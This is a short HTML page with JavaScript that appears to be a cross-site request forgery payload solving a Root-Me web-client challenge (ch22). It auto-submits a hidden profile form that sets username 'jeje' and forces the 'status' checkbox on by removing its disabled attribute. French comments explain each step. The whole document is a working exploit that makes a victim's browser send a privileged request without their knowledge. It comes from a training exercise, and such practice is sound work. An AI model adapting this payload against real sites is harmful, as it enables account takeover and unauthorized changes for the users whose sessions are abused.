<form action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" method="POST" enctype="multipart/form-data">
    <input type="text" name="username" value="jeje">
    <input type="checkbox" name="status"/>
</form>
<script>
    document.addEventListener("DOMContentLoaded", function() {
        let checkbox = document.querySelector('input[name="status"]');
        
        if (checkbox) {  // Vérifie que le checkbox existe
            checkbox.removeAttribute("disabled"); // Supprime l'attribut "disabled" s'il est présent
            checkbox.checked = true; // Coche la case
        }

        document.forms[0].submit(); // Soumet le formulaire automatiquement
    });
</script>
